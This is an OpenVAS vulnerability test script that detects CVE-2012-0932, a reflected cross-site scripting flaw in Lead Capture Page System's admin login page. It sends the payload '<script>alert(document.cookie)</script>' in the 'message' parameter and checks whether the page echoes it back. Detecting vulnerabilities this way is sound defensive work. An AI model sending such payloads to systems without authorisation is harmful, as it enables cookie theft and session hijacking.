###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_lead_capture_page_system_xss_vuln.nasl 11374 2018-09-13 12:45:05Z asteins $
#
# Lead Capture Page System 'message' Parameter Cross Site Scripting Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802577");
  script_version("$Revision: 11374 $");
  script_cve_id("CVE-2012-0932");
  script_bugtraq_id(51785);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-09-13 14:45:05 +0200 (Thu, 13 Sep 2018) $");
  script_tag(name:"creation_date", value:"2012-02-02 13:13:46 +0530 (Thu, 02 Feb 2012)");
  script_name("Lead Capture Page System 'message' Parameter Cross Site Scripting Vulnerability");
  script_xref(name:"URL", value:"http://secunia.com/advisories/47702");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/72623");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/108887/leadcapturepagesystem-xss.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary
  HTML and script code in a user's browser session in context of an affected site.");
  script_tag(name:"affected", value:"Lead Capture Page System");
  script_tag(name:"insight", value:"The flaw is due to an input passed to the 'message' parameter
  in 'admin/login.php' is not properly sanitised before being returned to the user.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"This host is running Lead Capture Page System and is prone to
  cross site scripting vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port)){
  exit(0);
}

host = http_host_name(port:port);

foreach dir (make_list_unique("/", "/leadcapturepagesystem", cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";
  rcvRes = http_get_cache(item: dir + "/login.php", port:port);

  if(egrep(pattern:'Powered By <a href="http://leadcapturepagesystem.com/',
           string:rcvRes))
  {
    sndReq = string("GET ", dir, "/admin/login.php?message=<script>alert(",
                    "document.cookie)</script> HTTP/1.1", "\r\n",
                    "Host: ", host, "\r\n\r\n");
    rcvRes = http_keepalive_send_recv(port:port, data:sndReq);

    if(rcvRes =~ "HTTP/1\.. 200" && "<script>alert(document.cookie)</script>" >< rcvRes)
    {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);
